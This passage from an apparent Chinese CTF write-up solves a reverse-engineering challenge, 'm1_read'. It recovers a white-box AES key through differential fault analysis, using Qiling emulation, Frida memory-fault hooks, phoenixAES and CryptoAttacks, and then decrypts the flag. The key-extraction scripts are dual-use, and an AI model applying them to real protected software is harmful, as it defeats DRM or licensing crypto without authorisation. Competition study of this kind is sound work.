class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br>key = <span class="hljs-string">&#x27;wvgitbygwbk2b46d&#x27;</span><br>enc = [<span class="hljs-number">0xE6</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD9</span>,<br>  <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xC0</span>,<br>  <span class="hljs-number">0x96</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xA5</span>,<br>  <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xC9</span>,<br>  <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xED</span>,<br>  <span class="hljs-number">0x92</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xA5</span>,<br>  <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xA7</span>]<br><br>enc1 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>  enc[i] = (enc[i] - <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) ^ <span class="hljs-number">0x1A</span><br>enc = <span class="hljs-built_in">bytes</span>(enc).decode()<br>new_table = <span class="hljs-string">&quot;456789&#125;#IJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123ABCDEFGH&quot;</span><br>old_table = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>aes_enc = base64.b64decode(enc.translate(<span class="hljs-built_in">str</span>.maketrans(new_table, old_table)))<br>aes = AES.new(<span class="hljs-string">b&#x27;wvgitbygwbk2b46d&#x27;</span>, AES.MODE_ECB) <span class="hljs-comment">#创建一个aes对象</span><br>flag = aes.decrypt(aes_enc) <span class="hljs-comment"># 解密密文</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="m1_read"><a class="markdownIt-Anchor" href="#m1_read"></a> m1_read</h2><h3 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h3><p>​这是一个关于 m1读卡器 的问题，其中包含 <code>DFA分析白盒AES算法</code> 的知识，具体参考：<a href="https://www.qinless.com/1647">DFA</a></p><h3 id="整体分析"><a class="markdownIt-Anchor" href="#整体分析"></a> 整体分析</h3><p>​这里是MFC写的读卡程序，发现那些按钮的主要处理函数似乎都会调用 <code>sub_140004A00</code>，跟进去看发现应该是对程序输入的数据进行统一处理的函数。其中调用了函数 <code>sub_140004BF0</code>，细看一下可以发现前面应该是AES白盒加密算法(可以对比N1CTF2021 hello这题)，后面对数据异或0x66。</p><h3 id="qiling模拟执行"><a class="markdownIt-Anchor" href="#qiling模拟执行"></a> Qiling模拟执行</h3><p>​这里我们的目的就是模拟执行函数 <code>sub_140004BF0</code> 来插入缺陷数据和获取错误密文，这里由分析，需要 16 组错误的密文才能恢复原始密钥。</p><h4 id="参数传入"><a class="markdownIt-Anchor" href="#参数传入"></a> 参数传入</h4><p>​这里的 <code>rcx</code> 存储着输入的地址，即传入的第一个参数的地址(没有读卡器，从别的 WP 中获取的信息)。这里模拟执行该函数，需要在函数起始地址修改寄存器的值，使其指向在内存中分配并初始化的<code>输入</code>。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307242131745.png" alt="image-20230724213132695" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_args</span>(<span class="hljs-params">ql: Qiling</span>):<br>    ql.mem.write(<span class="hljs-number">0x500000000</span>, <span class="hljs-string">b&quot;\x01&quot;</span> * <span class="hljs-number">16</span>) <span class="hljs-comment"># 在虚拟内存地址0x500000000(不干扰程序的内存空间)处写入一个16字节的字节序列，这是在向指定地址写⼊需要加密的内容</span><br>    ql.arch.regs.write(<span class="hljs-string">&quot;rcx&quot;</span>, <span class="hljs-number">0x500000000</span>) <span class="hljs-comment"># 将模拟器的rcx寄存器设置为 0x500000000</span><br>    ql.mem.write(<span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">16</span>)<br>    ql.arch.regs.write(<span class="hljs-string">&quot;rdx&quot;</span>, <span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x10</span>)<br>    ql.mem.write(<span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x20</span>, <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">16</span>)<br>    ql.arch.regs.write(<span class="hljs-string">&quot;rbx&quot;</span>, <span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x20</span>)<br>    <span class="hljs-keyword">return</span><br><br>start_addr = <span class="hljs-number">0x140004BF0</span><br>ql.hook_address(hook_args, start_addr)<br></code></pre></td></tr></table></figure><h4 id="定位插入缺陷数据的位置"><a class="markdownIt-Anchor" href="#定位插入缺陷数据的位置"></a> 定位插入缺陷数据的位置</h4><p>​首先确认 AES 最后两次列混合的位置，这里分为了前9轮和第10轮两种，那么最后两次列混合就在第8轮与第9轮之间，这里可知第九轮为<code>v4 == 0x9000</code> ，则需要在第八轮后，即 <code>v4 == 0x8000 ---- r12 == 8000h </code> 的位置之后插入缺陷数据。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307242013258.png" alt="image-20230724201323127" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307242015656.png" alt="image-20230724201532610" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">index = <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_code</span>(<span class="hljs-params">ql: Qiling</span>):<br>    <span class="hljs-keyword">if</span> ql.arch.regs.read(<span class="hljs-string">&quot;r12&quot;</span>) == <span class="hljs-number">0x8000</span>:<br>        <span class="hljs-keyword">global</span> index <span class="hljs-comment"># 定义为全局变量</span><br>        ql.mem.write(<span class="hljs-number">0x500000000</span> + index, <span class="hljs-string">b&quot;\x00&quot;</span>)<span class="hljs-comment"># 这里的 b&quot;\x00&quot; 就是插入的残缺数据</span><br>        index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>​这里 <code>ql.mem.write(0x500000000 + index, b&quot;\x00&quot;)</code> 与后面的16次循环都是为了插入缺陷数据而服务的，但是还需要一个正确的第10轮之后的密钥，所以不再加上这个语句和16个循环再单独执行一遍。</p><h4 id="获取密文"><a class="markdownIt-Anchor" href="#获取密文"></a> 获取密文</h4><p>​函数在 <code>ecx的地址处</code> 进行更改，所以最后也在ecx处获取错误密文即可。(先不关注最后的 xor 0x66)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307242217734.png" alt="image-20230724221758695" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307242218611.png" alt="image-20230724221820579" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_enc</span>(<span class="hljs-params">ql: Qiling</span>):<br><span class="hljs-built_in">print</span>(ql.mem.read(<span class="hljs-number">0x500000000</span>, <span class="hljs-number">16</span>).<span class="hljs-built_in">hex</span>())<br><span class="hljs-keyword">return</span><br><br>enc_after = <span class="hljs-number">0x1400053CA</span><br>ql.hook_address(hook_enc, enc_after)<br></code></pre></td></tr></table></figure><h4 id="获取所有错误密文"><a class="markdownIt-Anchor" href="#获取所有错误密文"></a> 获取所有错误密文</h4><p>​这里经过验证，错误密文与原先密文相比，只有4个字节不同，则此方法可行。那么就来只需要逐字节来插入缺陷数据即可得到所有的错误密文。这里通过更改 <code>index</code> 的值来逐字节插入缺陷数据。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> qiling <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> qiling.const <span class="hljs-keyword">import</span> QL_VERBOSE<br><br><span class="hljs-keyword">index</span> = <span class="hljs-number">0</span><br>ql = Qiling(<br>    [&quot;E:\\reverse\\source\\frame\\qiling\\examples\\rootfs\\x8664_windows\\m1_read.exe&quot;],<br>    r&quot;E:\\reverse\\source\\frame\\qiling\\examples\\rootfs\\x8664_windows&quot;,<br>    <span class="hljs-keyword">verbose</span>=QL_VERBOSE.<span class="hljs-keyword">OFF</span>,<br>)<br><br><br>def hook_args(ql: Qiling):<br>    ql.mem.<span class="hljs-keyword">write</span>(<span class="hljs-number">0x500000000</span>, b&quot;\x01&quot; * <span class="hljs-number">16</span>)<br>    ql.arch.regs.<span class="hljs-keyword">write</span>(&quot;rcx&quot;, <span class="hljs-number">0x500000000</span>)<br>    ql.mem.<span class="hljs-keyword">write</span>(<span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x10</span>, b&quot;\x00&quot; * <span class="hljs-number">16</span>)<br>    ql.arch.regs.<span class="hljs-keyword">write</span>(&quot;rdx&quot;, <span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x10</span>)<br>    ql.mem.<span class="hljs-keyword">write</span>(<span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x20</span>, b&quot;\x00&quot; * <span class="hljs-number">16</span>)<br>    ql.arch.regs.<span class="hljs-keyword">write</span>(&quot;rbx&quot;, <span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x20</span>)<br>    <span class="hljs-keyword">return</span><br><br><br>def hook_code(ql: Qiling):<br>    <span class="hljs-keyword">if</span> ql.arch.regs.<span class="hljs-keyword">read</span>(&quot;r12&quot;) == <span class="hljs-number">0x8000</span>:<br>        <span class="hljs-keyword">global</span> <span class="hljs-keyword">index</span><br>        ql.mem.<span class="hljs-keyword">write</span>(<span class="hljs-number">0x500000000</span> + <span class="hljs-keyword">index</span>, b&quot;\x00&quot;)<br>        <span class="hljs-keyword">index</span> += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span><br><br><br>def hook_enc(ql: Qiling):<br>    print(ql.mem.<span class="hljs-keyword">read</span>(<span class="hljs-number">0x500000000</span>, <span class="hljs-number">16</span>).hex())<br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">if</span> __name__ == &quot;__main__&quot;:<br>    index_addr = <span class="hljs-number">0x1400052C5</span><br>    start_addr = <span class="hljs-number">0x140004BF0</span><br>    end_addr = <span class="hljs-number">0x14000542D</span><br>    enc_after = <span class="hljs-number">0x1400053CA</span><br>    ql.hook_address(hook_args, start_addr)<br>    ql.hook_address(hook_code, index_addr)<br>    ql.hook_address(hook_enc, enc_after)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):<br>        ql.run(<span class="hljs-keyword">begin</span>=start_addr, end=end_addr)<br></code></pre></td></tr></table></figure><h4 id="获取正确第10轮密文"><a class="markdownIt-Anchor" href="#获取正确第10轮密文"></a> 获取正确第10轮密文</h4><p>​将 <code>ql.mem.write(0x500000000 + index, b&quot;\x00&quot;)</code> 与 <code>16轮循环</code> 从获取错误密钥的代码中去掉即可。</p><h4 id="获得原始密钥"><a class="markdownIt-Anchor" href="#获得原始密钥"></a> 获得原始密钥</h4><p>​得到16个错误密文，再加上一个正确的密文，就可以获得第10轮的密钥。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> phoenixAES<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tracefile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> t:<br>    t.write(<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    e14d5d0ee27715df08b4152ba23da8e0</span><br><span class="hljs-string">    d24d5d0ee27715ac08b4bf2ba272a8e0</span><br><span class="hljs-string">    e14d5d73e27708df0878152b843da8e0</span><br><span class="hljs-string">    e14dd50ee23415df7fb4152ba23da890</span><br><span class="hljs-string">    e16f5d0e537715df08b415e7a23dc6e0</span><br><span class="hljs-string">    e11a5d0e057715df08b4151ba23d99e0</span><br><span class="hljs-string">    574d5d0ee277157508b4df2ba234a8e0</span><br><span class="hljs-string">    e14d5d49e27785df0840152bff3da8e0</span><br><span class="hljs-string">    e14db80ee2d215dfceb4152ba23da868</span><br><span class="hljs-string">    e14dc60ee2bf15dfc4b4152ba23da8bf</span><br><span class="hljs-string">    e1425d0e5e7715df08b415b6a23d4ce0</span><br><span class="hljs-string">    5d4d5d0ee277159608b42f2ba297a8e0</span><br><span class="hljs-string">    e14d5d6ce2773ddf089d152ba93da8e0</span><br><span class="hljs-string">    e14d5dcde2772adf084b152bba3da8e0</span><br><span class="hljs-string">    e14df40ee27115df96b4152ba23da881</span><br><span class="hljs-string">    e11b5d0e337715df08b41544a23df3e0</span><br><span class="hljs-string">    fa4d5d0ee27715af08b42e2ba2c2a8e0</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.encode(<br>            <span class="hljs-string">&quot;utf8&quot;</span><br>        )<br>    )<br>phoenixAES.crack_file(<span class="hljs-string">&quot;tracefile&quot;</span>, verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>​之后使用 <code>Stark</code> 项目就可以得到原始密钥</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307242234920.png" alt="image-20230724223417776" /></p><h4 id="获得flag"><a class="markdownIt-Anchor" href="#获得flag"></a> 获得flag</h4><p>​之后由 <code>out.bin</code> 文件中提取出密文，然后使用AES算法进行解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>enc = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;0B 98 7E F5 D9 4D D6 79 59 2C 4D 2F AD D4 EB 89&quot;</span>))<br>enc = <span class="hljs-built_in">bytes</span>([enc[i] ^ <span class="hljs-number">0x66</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])<br>key = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;00000000000000000000000000000000&quot;</span>)<br>aes = AES.new(key=key, mode=AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(aes.decrypt(enc))<br></code></pre></td></tr></table></figure><h3 id="直接解密"><a class="markdownIt-Anchor" href="#直接解密"></a> 直接解密</h3><p>​分析出了 ARS白盒加密算法，<code>比对N1CTF2021 hello</code> <a href="https://github.com/Nu1LCTF/n1ctf-2021/tree/84a3fff50ee0ef2f1fece112c75104600cc86a5d/Re/hello">参考解法</a>即Chow方案，然后对数据进行 xor 0x66操作。这里 hello 可以参考最开始的 DFA 的文章一起分析。</p><p>​首先从tbox解出key:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> CryptoAttacks.Block.whitebox_aes_sage <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> CryptoAttacks.Utils <span class="hljs-keyword">import</span> *<br><br>T = [<span class="hljs-number">0x7C</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x39</span>, ... , <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>]<br><br>TTyboxFinal = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(T), <span class="hljs-number">256</span>):<br>    TTyboxFinal.append(T[i:i+<span class="hljs-number">256</span>])<br><br>key_recovered = recover_key_unprotected_wbaes_from_TTyboxFinal(TTyboxFinal)<br>key = matrix_to_array(key_recovered)<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment"># print(&#x27;&#x27;.join(list(map(chr,key))))</span><br></code></pre></td></tr></table></figure><p>​得到key为：b’\x00’*16，之后就是正常aes进行解密。</p><blockquote><p>库的地址为:<a href="https://github.com/GrosQuildu/CryptoAttacks%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%89%E8%A3%85%E5%B9%B6%E4%B8%8D%E6%88%90%E5%8A%9F%EF%BC%8C%E5%85%B6%E4%B8%ADwhitebox_aes.sage%E5%A4%9A%E6%96%B9%E6%8A%A5%E9%94%99%EF%BC%8C%E5%8F%AF%E8%83%BD%E9%9C%80%E8%A6%81%E5%9C%A8sage%E7%8E%AF%E5%A2%83%E4%B8%AD%E5%AE%9E%E7%8E%B0(maybe)">https://github.com/GrosQuildu/CryptoAttacks，但是安装并不成功，其中whitebox_aes.sage多方报错，可能需要在sage环境中实现(maybe)</a></p></blockquote><h3 id="frida模拟执行"><a class="markdownIt-Anchor" href="#frida模拟执行"></a> frida模拟执行</h3><blockquote><p>frida -p &lt;PID或者进程名称&gt; -l hook_example.js</p></blockquote><h4 id="得到161个密文"><a class="markdownIt-Anchor" href="#得到161个密文"></a> 得到16+1个密文</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> baseAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;m1_read.exe&quot;</span>);<span class="hljs-comment">//使用frida的&quot;Module.findBaseAddress&quot;来查找目标程序</span><br><span class="hljs-keyword">var</span> whiteAES = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(baseAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x4BF0</span>), <span class="hljs-string">&#x27;pointer&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;pointer&#x27;</span>])<span class="hljs-comment">// 创建一个NativeFunction对象，用于调用位于&quot;m1_read.exe&quot;程序基址加上0x4BF0偏移的函数。接收两个参数，均为指针，并返回一个指针。这里实际上是在将&quot;m1_read.exe&quot;中的函数whiteAES绑定到JavaScript中，以便我们可以在后面的代码中调用它。</span><br><span class="hljs-keyword">var</span> count = <span class="hljs-number">9</span>;<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(baseAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x4C2C</span>), &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<span class="hljs-comment">//进入目标函数时</span><br>        count++;<br>        <span class="hljs-keyword">if</span> (count == <span class="hljs-number">9</span>) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">rdi</span>.<span class="hljs-title function_">add</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">16</span>)).<span class="hljs-title function_">writeU8</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">256</span>))<br>        &#125;<br>    &#125;,<span class="hljs-comment">//在这里，count递增，并且如果count等于9，则在rdi寄存器指向的内存地址上随机写入一个字节(0-255的随机值)</span><br>    <span class="hljs-attr">onLeave</span>: <span class="hljs-function">(<span class="hljs-params">retval</span>) =&gt;</span> &#123;<br><br>    &#125;<br>&#125;)<br><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>; index &lt; <span class="hljs-number">33</span>; index++) &#123;<br>    <span class="hljs-keyword">var</span> l = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocAnsiString</span>(<span class="hljs-string">&quot;1234567890abcdef&quot;</span>);<br>    <span class="hljs-keyword">var</span> b = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-title function_">whiteAES</span>(l, b);<span class="hljs-comment">//这行代码调用之前绑定的whiteAES函数，传入l和b作为参数</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b.<span class="hljs-title function_">readByteArray</span>(<span class="hljs-number">16</span>));<span class="hljs-comment">//最后，它将读取并打印由b指向的16字节内存区域的内容</span><br>    count = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里进行异或处理，恢复正常AES的结果(从结果中随意挑选了17个)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">str_table = [<span class="hljs-string">&quot;ca 42 9f dc 6b fa 9b 5e 54 0c 8f 14 b0 3b ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 9f 36 6b fa ee 5e 54 c8 8f 14 c9 3b ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 2a dc 6b 53 9b 5e f2 0c 8f 14 b0 3b ae 05&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 9f b4 6b fa 7d 5e 54 fd 8f 14 fe 3b ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;fd 42 9f dc 6b fa 9b 72 54 0c a8 14 b0 48 ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 9f 70 6b fa ba 5e 54 21 8f 14 3f 3b ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 0c dc 6b d7 9b 5e 2a 0c 8f 14 b0 3b ae 6b&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 9f dc 6b fa 9b 5e 54 0c 8f 14 b0 3b ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 39 dc 6b a0 9b 5e ec 0c 8f 14 b0 3b ae c0&quot;</span>,<br>             <span class="hljs-string">&quot;2b 42 9f dc 6b fa 9b f5 54 0c 80 14 b0 af ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 9f dc 6b fa 9b 5e 54 0c 8f 14 b0 3b ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;c1 42 9f dc 6b fa 9b 95 54 0c 0e 14 b0 34 ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 ec dc 6b 77 9b 5e f7 0c 8f 14 b0 3b ae 51&quot;</span>,<br>             <span class="hljs-string">&quot;ca 5e 9f dc 52 fa 9b 5e 54 0c 8f 99 b0 3b df 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 02 9f dc c0 fa 9b 5e 54 0c 8f 92 b0 3b f1 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 9f dc 6b fa 9b 5e 54 0c 8f 14 b0 3b ae 88&quot;</span>,<br>             <span class="hljs-string">&quot;ca 42 9f b4 6b fa 7d 5e 54 fd 8f 14 fe 3b ae 88&quot;</span>]<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str_table:<br>    val = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytes</span>.fromhex(s))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        val[i] ^= <span class="hljs-number">0x66</span><br>    <span class="hljs-built_in">print</span>(val.<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h4 id="获得正确第10轮密文"><a class="markdownIt-Anchor" href="#获得正确第10轮密文"></a> 获得正确第10轮密文</h4><p>​同上，把相应的数据填入上面的代码中</p><h4 id="获得flag-2"><a class="markdownIt-Anchor" href="#获得flag-2"></a> 获得flag</h4><p>​之后使用 <code>Stark</code> 项目就可以得到原始密钥，然后使用上述代码获得flag</p><h1 id="das7月"><a class="markdownIt-Anchor" href="#das7月"></a> DAS7月</h1><h2 id="helloworld"><a class="markdownIt-Anchor" href="#helloworld"></a> helloworld</h2><p>​根据字符串信息可得知程序基于oatpp框架开发，程序无符号，所以尝试编译一份demo，可参考<a 